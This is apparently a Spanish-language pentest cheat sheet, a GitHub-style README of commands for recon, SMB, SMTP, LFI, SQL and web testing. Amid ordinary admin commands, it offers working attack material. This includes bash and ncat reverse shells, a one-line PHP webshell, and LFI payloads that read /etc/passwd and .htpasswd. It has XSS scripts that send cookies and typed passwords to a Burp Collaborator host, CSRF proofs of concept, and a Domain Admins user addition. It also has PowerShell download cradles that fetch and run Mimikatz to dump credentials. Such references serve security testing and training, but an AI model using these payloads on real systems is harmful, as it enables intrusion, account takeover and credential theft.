# Pentest
Un compendio de notas sobre pentest.

************************************************************************************************
# Análisis de binarios
## 32 bits vs 64 bits

Se abre el binario con un visor hexadecimal y se busca lo siguiente:

Si es de 32 bits
+ PL
+ 50 45 00 00 4C

Si es de 64 bits
+ PE..dt
+ 50 45 00 00 64 86

************************************************************************************************
# Android
## Herramientas utiles
+ Genymotion
+ Android Studio

## adb

Puertos default:
+ 
+ 

Comandos útiles
~~~bash
# Mostrar menú de la herramienta
adb

# Conectarte a un dispositivo mediante adb
adb connect 172.27.253.6:5555

# Listar dispositivos
adb devices

# Instalar en aplicación en emulador
adb -s <emulator> install <application.apk>

# Reemplaza la copia existente de la aplicación
adb -s <emulator> install -r <application.apk>

# Ingresa a una shell de un device
adb -s <emulator> shell

# Envía un documento a un emulador
adb -s <emulator> push '/home/user/local/file' '/data/local/' 

# Descarga un documento desde un emulador
adb -s pull 'sdcard/log.txt' '/home/user/local/file'

~~~

************************************************************************************************
# Apache

## Obtener versiones
+ curl
+ netcat
+ telnet

~~~bash
curl -I http://google.com

~~~


## Enumerar carpetas (dirb)
+ dirb
+ gobuster
+ nmap

~~~bash
# Enumerar carpetas con dirb
dirb http://sitio.com -o output_file.txt

# Enumerar carpetas con nmap
nmap -P0 -p80 --script http-enum 127.0.0.1
~~~

## Dirbfile
~~~bash
# clonar repositorio
git clone https://github.com/elcaza/dirbfile.git

# Uso
./dirbfile file
~~~


************************************************************************************************
# Envío de información
## Vía POST

**BASH**
~~~bash
curl --header "Content-Type: application/json" \
    --request POST \
    --data '{"username":"xyz","password":"xyz"}' \
    http://localhost:3000/
~~~

Más información
+ https://linuxize.com/post/curl-post-request/


## Vía GET
**BASH**
<!--
~~~bash
GET_USER="user"
GET_PASS="pass"
URL=""
curl https://reqbin.com/
~~~
-->

************************************************************************************************
# Exfiltración de información
## Linux

### Comprimir información 
~~~bash
# Respaldo omitiendo erroes, tipos de archivos y carpetas
tar --warning=no-file-changed --exclude={*.mp4,*.mp3,'./public_html'} --ignore-failed-read -zcvf respaldo.tar.gz .
~~~

### Conseguir información
~~~bash

~~~

************************************************************************************************
# Google Dorks
## Buscadores
+ Google
+ Duckduckgo
+ bing
~~~bash
# inurl
inurl:view/view.shtml
inurl:/cgi-bin/guestimage.html
inurl:"/owa/auth/logon.asp"

# intitle
intitle:"index of /"
intitle:"Nessus Scan Report"
intitle:"index of /" "Microsfot-ISS/6.0"
intitle:"index of /" “Microsfot-ISS/5.0”

# filetype
filetype:txt
filetype:sql
filetype:xlsx
filetype:md

# Concatenando (Bloqueado desde google, pero vigente en duckduckgo y bing)
site:* filetype:xlsx

# link (-site:sitioexcluido)
link:www.sitioejemplo.com -site:sitioejemplo.com
link:www.sitioejemplo.com -site:sitioejemplo.com -site:sitioejemploespana.com -site:sitioejemplomexico.com

# Password
filetype:inc intext:mysql_connect password -please -could

# Obtener información de un sitio
info:site.com

# Ver si está habilitada la indexación de carpetas
intitle:"index of" site:site.com

# Ver información del conusuario.servidorto de whois
whois site.com
~~~

## Bing
~~~bash
# contains
# Los resultados esperados están dentro de un CMS programado en el lenguaje que se indique
contains:php filetype.pdf

# ip medio parchado, pero se puede evadir vía url
# https://www.bing.com/search?q=IP:108.167.137.42
IP:108.167.137.42
~~~

************************************************************************************************
# Hashes
## Información de hashesh
* https://rhash.sourceforge.net/hashes.php#:~:text=The%2032%2Dbit%20long%20hash,in%20the%20EDonkey%20p2p%20network.


************************************************************************************************
# Herramientas útiles

## CRACKMAPEXEC

~~~bash
# Enumerar dominio
crackmapexec smb 10.10.10.10

# Comprobar contraseñas
crackmapexec smb 10.10.10.10 -u 'user' -p 'password'

# Ver recursos compartidos
crackmapexec smb 10.10.10.10 -u 'user' -p 'password' --shares
~~~

## Cyberchef
Un montón de herramientas para códificar/decodificar
+ https://gchq.github.io/CyberChef/

## smbmap
~~~bash
# Ver recursos compartidos
smbmap -H 10.10.10.10

# Leer algún recurso compartido (preivamente sale)
smbmap -H 10.10.10.10 -r Nombre_recurso

# Descargar un recurso
smbmap -H 10.10.10.10 --download Nombre_recurso

# Leer carpetas/archivos con credenciales
smbmap 10.10.10.10 -u 'user' -p 'password' -r Carpeta
~~~

## eyewitness
~~~bash
cat ips_all.txt | (while read hostname; do cat puertos_unicos.txt | (while read PORT; do echo $hostname:$PORT; done); done) > eyewitness.txt
~~~

## Ngrok
+ https://ngrok.com/

## Passwords
~~~bash
cat passwords_burp.txt | (while read password; do echo -n "carlos" | (while read USERS; do echo $USERS:$password; done); done) > eyewitness.txt
~~~

## Ver tu IP pública
~~~
curl ifconfig.me
~~~

## Webhook
Para recibir emails y peticiones sin una IP pública
+ https://webhook.site

************************************************************************************************
# Kioscos Windows

## Comandos útiles
~~~bash
# usuario local
whoami

# hostname
hostname

# version de windows
winver

# Visor de eventos
eventvwr
~~~

************************************************************************************************
# LDAP

## ?
~~~bash
ldapsearch -h 192.168.100.1 -x -s base namingcontexts
~~~
+ https://bmaupin.github.io/wiki/applications/misc/ldapsearch.html

************************************************************************************************
# LFI (Local File Inclusion)

## ?
~~~bash
# añadir parametros una busqueda para generar errores nos muestra recursos que podrían ser de utilidad
http://172.16.22.14/index.html?page=blog&id=coso
    # Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20
~~~

## Escapar la concatenación con extensión

```bash
# Si la página concatena (nombre + .php)
http://172.16.22.14/index.html?page=blog

# Esto buscaría passwd.php
http://172.16.22.14/index.html?page=../../../../etc/passwd

# Para evitarlo usar el terminador de cadena de C (%00)
http://172.16.22.14/index.html?page=../../../../etc/passwd%00

# Sacando los usuarios que serán de interes debido a sus privilegios
http://172.16.22.14/index.html?page=../../../../etc/groups%00


http://172.16.22.14/index.html?page=../../../../../etc/group%00
    # users:x:100:usuario1,usuario2,usuario3,admin
    # admins:x:507:usuario1,admin

# Anexo: Lo que pasa en c:
    # char cadena[30] = "Hola mundo";
    # char cadena2[30] = "hola mun\0do";
    # puts(cadena); // Hola mundo
    # puts(cadena2); // Hola mun
```

## Sitios con configuraciones .htaccess
Tomando como base:
+ http://172.16.22.14/index.html?page=blog (Sitio con LFI)
+ http://172.16.22.14/restringido (Este pide autenticación DIGEST o BASIC)

Inferimos que tenemos dos sitios:
+ /var/www/html/sitioweb
+ /var/www/html/restringido

Por lo que podemos:
~~~bash
# Obtenemos configuración de .htaccess
http://172.16.22.14/index.html?page=../restringido/.htaccess%00
# /var/www/html/sitioweb/..restringido/.htaccess
    # AuthType Basic
    # AuthName "Restricted - authentication required"
# Aquí incluimos la ruta de los password hasheados
    # AuthUserFile /var/www/html/restringido/.htpasswd 
    # Require valid-user

# Obtenemos configuración de .htaccess
http://172.16.22.14/index.html?page=../restringido/.htpasswd%00
    # user1:mHjBL6MLRc3nQ
    # user2:OkNYEpU0yapIs
    # admin:vjX9YIkiN3RL6
~~~

El hasheo es de 13 caracteres
+ vjX9YIkiN3RL6
+ DES 13 chars 


************************************************************************************************
# Linux

## Administración básica
~~~bash
# Crear un grupo
groupadd grupo

# Crear usuarios
    # adduser => Script
    # useradd => Manual

useradd -ms /bin/bash superadmin
# -m Crea carpeta home
# -s Asigna shell

# Añadir un usuario a grupo
usermod -a -G sudo soporte

# Cambia password
passwd superadmin

# Variable path
export PATH=/usr/bin:/usr/sbin:/bin

## Agregamos contraseña al usuario appuser
RUN echo 'user:password' | chpasswd

~~~

### Información del sistema
~~~bash
# Check system version
lsb_release -a
cat /etc/issue
cat /etc/os-release
hostnamectl
~~~

### Teclado
~~~bash
# 1) Configurar teclado
dpkg-reconfigure keyboard-configuration

# 2) Aplicar la configuración del teclado (solo funciona para esa sesión)
setupcon

# 3) Para un cambio permantente
dpkg-reconfigure console-setup
~~~

## Descargar archivos

### wget

~~~bash
# Descarga un archivo
wget <URL>

# Descarga y renombra un archivo
wget -O <filename> <URL>

# Descarga varios archivos desde un archivo de texto con las urls
wget -i download_files.txt

# Descarga una carpeta
wget -r ftp://server-address.com/directory

# Descargar de manera recursiva esos elementos
wget -nd -r -A pdf,doc,docx,xls,xlsx,jpg www.rediris.es
~~~

### curl

~~~bash
# Descarga un archivo
curl -O URL
curl -O URL1 URL2 URL3

# Descarga y renombra un archivo
curl -o filename URL
~~~


************************************************************************************************
# Metasploit
## Logs
Problema:
+ La salida de los comandos en metasploit nos es procesable con << |  >>
    + Por ejemplo la salida de enum_ssh para filtrar únicamente los usuarios validos

Con spool puedes definir un lugar en que se guardarán todo lo que imprima en pantalla metasploit

~~~bash
# Apagar los logs
spool off

# Añadir una ruta en que se harán los logs
spool /ruta/para/guardar.log

# Si lo quieres tener por siempre 
spool /home/<username>/.msf3/logs/console.log
~~~

Más información:
+ https://blog.rapid7.com/2011/06/25/metasploit-framework-console-output-spooling/


************************************************************************************************
# nmap
## Secuencia

1. Corroborar que el host esté arriba, considerar omitir la resolución DNS
    + Puede ser con o sin ping
2. Detección única de puertos (Sin versiones ni nada)
3. Detección de versiones y vulnerabilidades 

## Escaneo de un segmento de red
~~~bash
# Escanear un segmento de red
nmap -sn 172.27.48.0/24

# Escanear un segmento de red (varias ips)
nmap -sn 172.27.253.0/24 172.27.252.0/29
~~~

## Descubrimiento rápido
~~~bash
# Escaneo a top ports
nmap --max-retries 0 --top-ports 5000 site.com 
# Escaneo a todos los puertos
nmap --max-retries 0 -p- site.com
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -P0 site.com 
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -Pn site.com 
~~~

## Detección de versiones y vulnerabilidades
~~~bash
# Sintaxis básica
nmap --max-retries -p 22,80,443,3000 -sV

# -sV => Mostrar versiones
# -O => Identifica S.O.
# -p => Define el puerto

# Identifica vulnerabilidades
nmap -sV -p80,443 --script=vulners ip

# Identifica vulnerabilidades por puerto asociado
nmap -p80,8080 –sV –sC ip
# -sC => Scripts de vulnerabilidades acorde al puerto analizado

# Busca vulnerabilidades
nmap 192.160.100.1 -Pn -sCV

# Realizar escaneo completo a los puertos determinados
nmap -A -p80,443 ip
~~~

## Escaneo UDP
~~~bash
# Escaneo a puertos UDP
nmap -sU 172.24.16.25
~~~

## Scripts

~~~bash
# Actualiza la BD de scripts
nmap --script-updatedb

# Localiza los scripts de nmap
locate nse | grep script

# Ayuda sobre el script
nmap --script-help=nombre_scrip
~~~

Más información:
+ https://linuxhint.com/stealth_scans_nmap/

************************************************************************************************
# Pretty shell

## rlwrap (Historial de comandos)
~~~bash
# Instala rlwrap
sudo apt install rlwrap

# Para capturar la reverse shell
rlwrap nc -lp 5000
~~~

## Python pretty shell
~~~bash
# Una vez que tienes la conexión
python -c "import pty; pty.spawn('/bin/bash')"

# Otra opción es
python -c "import pty; pty.spawn('/bin/sh')"
~~~



************************************************************************************************
# Python
## Servidores web

~~~python
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 7777
~~~
# SQL

## Asignar permisos
~~~bash
GRANT ALL PRIVILEGES ON mi_base_de_datos.* TO mi_usuario@localhost;
FLUSH PRIVILEGES;
~~~

## Borrar base de datos
~~~bash
DROP DATABASE base_de_datos;
~~~

## Cambiar password de usuarios sin conocer el password
~~~bash
# Ver versión mysql/mariadb
mysql --version

# Detener mysql
sudo systemctl stop mysql

# Iniciar MySQL sin seguridad
sudo mysqld_safe --skip-grant-tables --skip-networking &

# Iniciar sesión sin contraseña
mysql -u root

# Cambiar password 
FLUSH PRIVILEGES;
ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_password';

# Otra opción
SET PASSWORD FOR 'root'@'localhost' = PASSWORD('new_password');
~~~

## Ingresar a SQL
~~~bash
sudo mysql -p
~~~

## Listar usuarios
~~~bash
# Listar usuarios en MySQL
SELECT user FROM mysql.user;

# Listar usuarios y hosts
SELECT user,host FROM mysql.user;

# Listar usuarios, hosts y password
SELECT user,host,password FROM mysql.user;

# Show Current and Current Logged Users
SELECT current_user();

# If you need more information, you can modify the query to display currently logged-in users with their states
SELECT user,host, command FROM information_schema.processlist;

~~~

## Listar Bases de datos y ver permisos
~~~bash
# Ver bases de datos
SHOW DATABASES;
SHOW SCHEMAS;
~~~

## Listar permisos
~~~bash
# Ver permisos de una BD en especifico
SELECT user,host from mysql.db where db='DB_NAME';

# Ver privilegios de todos los usuarios
SELECT user, host, password, select_priv, insert_priv, shutdown_priv, grant_priv FROM mysql.user;

# Ver permisos para BD individuales
SELECT user, host, db, select_priv, insert_priv, grant_priv FROM mysql.db;

# Ver privilegios
SHOW grants;
~~~

## Respaldar una BD
~~~bash
# Crear respaldo de la BD
mysqldump -u nombre_usuario -p nombre_bbdd > nombre_archivo_dump.sql
~~~

## Importar una BD
~~~bash
# Crear una nueva base de datos
CREATE DATABASE nueva_bbdd;

# Importar una BD
mysql -u nombre_usuario -p nueva_bbdd < nombre_archivo_dump.sql;
~~~

## Referencias:
+ https://www.hostinger.com/tutorials/mysql-show-users/#:~:text=2.-,Use%20the%20MySQL%20SHOW%20USERS%20Query,have%20been%20created%20in%20MySQL.
+ https://www.digitalocean.com/community/tutorials/how-to-reset-your-mysql-or-mariadb-root-password

************************************************************************************************
# Reverse Shell & Webshell
## Linux

### Reverse shell con bash
~~~bash
# En la máquina del ausuario.servidorante
nc -lp 9999

# En la máquina de la victima
# Cambiar IP & PORT
# bash -i >& /dev/tcp/IP/PORT 0>&1
bash -i >& /dev/tcp/172.16.16.10/9999 0>&1
bash -i >& /dev/tcp/127.0.0.1/5000 0>&1
~~~

### Reverse shell con Netcat
~~~bash
# Requiere ncat
sudo apt install ncat

# En la máquina del ausuario.servidorante
ncat -lp 1234

# En la máquina de la victima
# Requiere: apt install ncat (Especificamente este paquete para la opción -e)
# Cambiar IP & PORT
# nc -e /bin/sh IP PORT
ncat -e /bin/sh 10.0.0.1 1234
~~~

+ Puedes encontrar shells más complejas en la carpeta [reverse-shells](./reverse-shells/)

### Webshells

#### PHP POST param
~~~php
# archivo.php
<?=`$_POST[0]`?>

# Uso
curl http://localhost/ruta/archivo.php -d "0=whoami"
~~~

#### P0wny-shell
+ https://github.com/flozz/p0wny-shell/blob/master/shell.php

************************************************************************************************
# RPC (135)

## Script de Python
+ https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py

~~~bash
./rpcdump.py 192.168.100.1
~~~

************************************************************************************************
# Secure Headers

## shcheck
+ https://github.com/santoru/shcheck

~~~bash
# Descarga
git clone https://github.com/santoru/shcheck.git

./shcheck.py https://site.com
~~~

## shcheckfile

~~~bash
# Requerimientos
git clone https://github.com/santoru/shcheck && cd shcheck
sudo cp shcheck.py /usr/local/bin/

# Descarga de la herramienta
git clone https://github.com/elcaza/shcheckfile.git
cd shcheckfile
./shcheckfile file.txt

~~~

************************************************************************************************
# SMB (Server Message Block)

## Detalles
+ Puerto 445
+ Versión SMB 1.0 => Conexión anónima permitida
+ Windows 2008 en adelante no hay conexión anónima
    + La versión SMB 1.0 podría estar habilitada por compatibilidad

## Autenticación
~~~bash
# Autenticación anónima
smbclient -L 172.27.30.30 -N
    # Caso deshabilitado
    # Anonymous login successful
    # 
    #         Sharename       Type      Comment
    #         ---------       ----      -------
    # SMB1 disabled -- no workgroup available


# Autenticación con usuario y contraseña
# % separa el usuario del password
smbclient -L 172.27.30.30 -U 'user%password'
    # Caso login correcto
    # Sharename       Type      Comment                                                                                                                                                                                                
    #    ---------       ----      -------                                                                                                                                                                                                

# Recursos compartidos por defecto   
    #    ADMIN$          Disk      Remote Admin                                                                                                                                                                                           
    #    C$              Disk      Default share                                                                                                                                                                                          
    #    IPC$            IPC       Remote IPC                                                                                                                                                                                             
    
    
    #    NETLOGON        Disk      Logon server share                                                                                                                                                                                     
    #    SYSVOL          Disk      Logon server share

# Recursos compartidos en el caso de usar Windows update                                                                                                                                                                           
    #    UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.                                                         
    #    WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.                                                                                                         
    #    WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.                                                                                                                          
        # SMB1 disabled -- no workgroup available   
~~~

## Entrada a los directorios
~~~bash
# Entrada a los directorios
# Para algunos casos se requiere usuario admin
smbclient //172.27.30.30/WsusContent -U 'user%password'

    # Caso usuario correcto y con privilgios suficientes
    # user:~# smbclient //172.27.30.30/C$ -U 'usuarioadmin%password'
    # Try "help" to get a list of possible commands.
# Una vez en el prompt (smb: \>) usar dir para listar
dir
    # $Recycle.Bin                      DHS        0  Thu Aug 22 11:50:45 2013
    # Documents and Settings            DHS        0  Thu Aug 22 10:48:41 2013
    # File.txt                              DR        0  Wed Sep  8 19:08:52 2021
    # Program Files                      DR        0  Wed Sep  8 20:30:07 2021
    # Program Files (x86)                 D        0  Thu Aug 22 11:39:32 2013
    # ProgramData                        DH        0  Wed Sep  8 19:11:24 2021
    # Users                              DR        0  Wed Sep  8 19:08:52 2021
    # Windows                             D        0  Wed Sep  8 18:52:38 2021

# Para obtener algun archivo get file
get File.txt
    # getting file \File.txt of size 0 as READMe.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

# Para quitar 
quit

#####################
    # Caso usuario correcto y con privilgios insuficientes
    # smbclient //172.27.30.30/WsusContent -U 'user%password'
    # tree connect failed: NT_STATUS_ACCESS_DENIED
~~~

## Para deshabilitar el compartir por defecto mediante llave de registro 
~~~bash
# llave para deshabilitar el autoshare (?)
# dar de alta double word y en valor 0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\AutoShareWks
~~~

## SMB vulnes nmap
~~~bash
# SMB
nmap 192.168.100.1 -Pn -p 445 -sCV –script vuln
~~~

************************************************************************************************
# SMTP (Simple Mail Transfer Protocol)
Puedes conectarte a través de varias herramientas, por ejemplo:
- netcat
- telnet
## Sacar la configuración del servidor
Requiere que tengas el nombre de dominio, pero este sale en el banner de bienvenida
+ 220 dmzweb.sitio.com ESMTP Sendmail 8.13.5/8.13.5; Mon, 4 Oct 2021 03:20:03 -0400

~~~bash
# Con telnet
telnet 172.27.254.20 25
# Nota el ehlo en lugar de helo
# Sustituir dmzweb.sitio.com por el nombre de dominio
ehlo dmzweb.sitio.com 
    # output
    # 250-dmzweb.sitio.com Hello [172.31.247.18], pleased to meet you
    # 250-ENHANCEDSTATUSCODES
    # 250-PIPELINING
    # 250-EXPN
    # 250-VERB
    # 250-8BITMIME
    # 250-SIZE
    # 250-DSN
    # 250-ETRN
    # 250-DELIVERBY
    # 250 HELP
# Para salir
quit

# Con netcat
nc 172.27.254.20 25
# Nota el ehlo en lugar de helo
# Sustituir dmzweb.sitio.com por el nombre de dominio
ehlo dmzweb.sitio.com 
    # output
    # 250-dmzweb.sitio.com Hello [172.31.247.18], pleased to meet you
    # 250-ENHANCEDSTATUSCODES
    # 250-PIPELINING
    # 250-EXPN
    # 250-VERB
    # 250-8BITMIME
    # 250-SIZE
    # 250-DSN
    # 250-ETRN
    # 250-DELIVERBY
    # 250 HELP
# Para salir
quit
~~~

## Enumerar cuentas de usuarios
~~~bash
nc 172.27.254.20 25
# Nota el helo en lugar de ehlo
helo dmzweb.sitio.com 
# Para enumerar se uso EXPN username
EXPN usuario1
    # Output
    # 550 5.1.1 usuario1... User unknown
EXPN root
    # 250 2.1.5 Nombre Apellido <usuario@dmzweb.sitio.com>
EXPN webmaster
    # 250 2.1.5 Nombre Apellido <usuario@dmzweb.sitio.com>
~~~

## Enviar correos sin autenticación
Tienes que tener una cuenta valida de correo
~~~bash
EXPN root
    # 250 2.1.5 Nombre ap <usuario.servidor@dmzweb.sitio.com>
mail from: usuario.servidor@dmzweb.sitio.com
    # 250 2.1.0 usuario.servidor@dmzweb.sitio.com... Sender ok
rcpt to: user@gmail.com
    # 250 2.1.5 user@gmail.com... Recipient ok
data
    # 354 Enter mail, end with "." on a line by itself
Subject: El asunto
Mensaje del email, terminando con un punto
.
# 250 2.0.0 1947Mnyw018712 Message accepted for delivery

~~~

************************************************************************************************
# SQL Injection
## Mediante URL


## Mediante parámetros



************************************************************************************************
# SSL
## Herramientas

Desde la web
+ https://www.ssllabs.com/ssltest/analyze.html

ssl scan
+ https://github.com/rbsec/sslscan

testssl
+ https://github.com/drwetter/testssl.sh

Guía de cifrados seguros e inseguros
+ https://ciphersuite.info/cs/?security=all&software=openssl&singlepage=true

## TestSSL from file
~~~bash
# Descargar testssl
git clone --depth 1 https://github.com/drwetter/testssl.sh.git --branch 3.0

# Análisis de varios sitios con output en HTML
./testssl.sh --html --file sitios.txt
~~~

************************************************************************************************
# Tareas en segundo plano y asincronas

## Con funciones
~~~bash
#!/usr/bin/bash
delayed_curl() {
	url=$1
	callback=$2
	seconds=$3

	sleep $seconds
	curl -s $url || $callback $url
}

loggin_error() {
	echo "error in: $1" >> error.log
}

for delay in 1 5 10; do
	echo $delay
	delayed_curl "www.asjdlfjsdf.com" loggin_error $delay &
	delayed_curl "https://webhook.site/0cd769e1-20ce-4b42-aa10-2e580fef6a26" loggin_error $delay &
done
~~~

## En una sola línea
~~~bash
time sleep 5 && curl -s "https://webhook.site/0cd769e1-20ce-4b42-aa10-2e580fef6a26" && echo "Ready! `date`" & echo "Comenzando (se imprime primero) `date`" 

# Output:
    # [1] 1156018
    # Comenzando (se imprime primero) jue 29 jun 2023 09:11:35 CST
    # real	0m5.002s
    # user	0m0.002s
    # sys	0m0.000s
    # Ready! jue 29 jun 2023 09:11:41 CST
~~~

************************************************************************************************
# Utilerías

## Imprimir todo lo que no es comentario
~~~bash
awk '!/#/' file
~~~
Referencias:
+ https://www.unixtutorial.org/awk-delimiter/

## Remover caracteres repetidos
~~~bash
tr -s 'character'
tr -s ' '
tr -s '\n'

~~~ 
## Borrar un caracter de un string
~~~bash
tr -d ".|,"
~~~

## Reemplazar una cadena por nada 
~~~bash
sed "s/|a|//g" 
sed "s/|a|/~b~/g" 
~~~

## Remover la última letra del string
~~~bash
sed 's/.$//'
~~~

## Descargar un archivo con scp
~~~bash
scp user@192.168.100.100:path/file.txt /local/dir
~~~

## Subir un archivo con scp
~~~bash
scp file user@192.168.100.100:path/file.txt
~~~

## Con llave publica
~~~bash
scp -i key_file.pem user@192.168.100.100:path/file.txt /local/dir
~~~

## Control con systemctl
~~~bash
# Systemctl
sudo systemctl status ssh
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh

# Preguntar si está activo
sudo systemctl is-active apache

# Preguntar si está habilitado
sudo systemctl is-enable apache
~~~

************************************************************************************************
# Web

## Headers web
### Evasión de bloqueos en Login Web
#### Vía X-Forwarded-For

Sustituir en las cabeceras de la petición
~~~bash
X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348

X-Forwarded-For: 203.0.113.195

X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178
~~~


Más información:
+ https://developer.mozilla.org/es/docs/Web/HTTP/Headers/X-Forwarded-For

### reset poisoning via middleware
#### X-Forwarded-Host

Sustituir en las cabeceras de la petición
~~~bash
X-Forwarded-Host: id42.example-cdn.com
~~~

Más información:
+ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host


## Exfiltrar información

~~~html
<script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
        method: 'POST',
        mode: 'no-cors',
        body:document.cookie
    });
</script>
~~~

## Keylogger en input
~~~html
<script>
    document.getElementsByName("password")[0].addEventListener('change',function(){
        console.log(this.value);
        the_username = document.getElementsByName("username")[0].value
        the_password = this.value;

        fetch('https://subdomain.burpcollaborator.net', {
            method: 'POST',
            mode: 'no-cors',
            body:the_username+"~"+the_password
        });
    });
</script>
~~~

## Nuevo login
~~~html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
~~~

## Cambio de contraseña inseguro
~~~html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
~~~

## Ejemplo CRSF en POST
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://000.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="new2&#64;email&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

~~~

## Ejemplo CRSF en GET
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<!--  <script>history.pushState('', '', '/')</script>-->
    <form action="https://000.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="new222&#64;email&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

~~~

## Ejemplo CSRF
~~~html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
~~~

## Ejemplo CSRF sin parametro CSRF
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://000.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="new1234&#64;email&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

~~~

## XSS

+ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## XSS Reflejado

~~~html
<iframe src="https://000.web-security-academy.net/?search=%3Cbody+onresize=print(1)%3E" width="1px" onload=this.style.width='0px'></iframe>
~~~


~~~html
<script>
location = "https://000.web-security-academy.net/?search=%3Cvideo2+id=x+onfocus=alert(document.cookie)+tabindex=1%3E#x";
</script>
~~~

~~~html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me1</text></a>
~~~

### A partir del tag de value en un input
~~~html
"onmouseover="alert(1)
~~~

### A partir de corromper el href
~~~html
<a id="author" href="javascript:this.addEventListener(&quot;click&quot;, alert(1))">text</a>
<a id="author" href="javascript:alert(2)">text</a>
~~~

### A partir de Access Key
~~~html
Visitando:
/?'accesskey='x'onclick='alert(1)
/?'accesskey='x'onclick='alert(1)'

Referencias
<button accesskey="s">Stress reliever</button>
<link rel="canonical" accesskey="X" onclick="alert(1)" />
<link rel="alternate" accesskey="y" onclick="alert(2)" />
https://url.com/?'accesskey='x'onclick='alert(1)
~~~

### Interpretación matemática
~~~html
Funciona porque javascript lo interpreta como una ecuación matemática: 

# Multiplicación
https://000.web-security-academy.net/?search=%27*alert(1)*%27

# Resta
https://000.web-security-academy.net/?search=%27*alert(1)*%27
~~~

### Escapar terminadores
~~~javascript
https://000.web-security-academy.net/?search=\%27-alert(1);//+comentario
\'-alert(1);//+comentario

var searchTerms = '\\'-alert(1);// comentario';
~~~

### Sustituyendo windows para lanzar un error
~~~javascript

5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
~~~
Referencia:
+ https://stackoverflow.com/questions/64416874/javascript-window-object-window-what-does-this-code-do

************************************************************************************************
# WiFi
## Escanear redes
~~~bash
# Ecacenar interfaz
# iwlist <interfaz> scan | grep SSID
iwlist wlan0 scan | grep SSID
    # ESSID:"Red 1"
    # ESSID:"Red 2"
~~~


************************************************************************************************
# Windows
## Descargar archivos

**Requiere administrador**
~~~powershell
# Metodo 1 - Download in PowerShell 2 ^
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/elcaza/pentest/main/README.md","C:\path\file")

# Metodo 2 - Download with Invoke-WebRequest ^
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -OutFile "C:\path\file"

# Metodo 3 - Download with Invoke-WebRequest ^
wget "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -outfile "file"
~~~

Más información:
+ https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/

## Añadir usuario a Dominio
~~~ powershell
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN
~~~ 

## Ejecutando un living off the land
+ Windows Defender lo detecta como actividad maliciosa

~~~powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
~~~

iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JJ8R4'))

Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.100.59:3000/poc.ps1')


Más información
+ https://lolbas-project.github.io/
+ https://github.com/LOLBAS-Project/LOLBAS
+ https://www.elladodelmal.com/2020/09/windows-amsi-antimalware-scan-interface.html
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-network-connections-microsoft-defender-antivirus?view=o365-worldwide
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-exclusions?view=o365-worldwide
+ https://www.gb-advisors.com/es/mimikatz/#:~:text=Windows%20cuenta%20con%20la%20funcionalidad,la%20clave%20secreta%20para%20descifrarlas.

## Obteniendo datos del sistema

~~~cmd
REM REM = Comentario en CMD
REM Obtener información
systeminfo 
~~~